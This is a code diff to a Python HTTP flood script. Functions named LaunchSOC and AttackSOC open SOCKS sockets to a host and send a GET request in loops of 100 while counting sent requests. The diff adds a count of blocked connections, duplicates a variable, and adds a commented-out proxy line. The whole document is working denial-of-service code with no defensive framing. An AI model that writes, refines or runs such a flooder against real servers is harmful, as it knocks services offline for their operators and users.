@@ -8,7 +8,7 @@ port = 80
 rs = 0
 closed = 0
 red = 255, 0, 0
-
+closed = 0
 
 def LaunchSOC(th):
     req = "GET " + '/' + " HTTP/1.1\r\nHost: " + host + "\r\n"
@@ -26,7 +26,7 @@ def LaunchSOC(th):
 
 
 def AttackSOC(req):
-    global rs, closed, thd
+    global rs, closed, thd, closed
     s = socks.socksocket()
     s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
     s.connect((str(host), int(80)))
@@ -36,12 +36,13 @@ def AttackSOC(req):
                 for _ in range(100):
                     s.send(str.encode(req))
                     rs = rs + 1
-                    print("" + Fore.LIGHTCYAN_EX + f"Sent: {rs}" + Fore.RESET + "", end='\r')
+                    print("" + Fore.LIGHTCYAN_EX + f"Sent: {rs} Blocked: {closed}" + Fore.RESET + "", end='\r')
             except:
+                closed = closed + 1
                 s.close()
         except:
             pass
-
+# socks.set_default_proxy()
 
 if __name__ == '__main__':
     # host = input("HTTP Host: ")
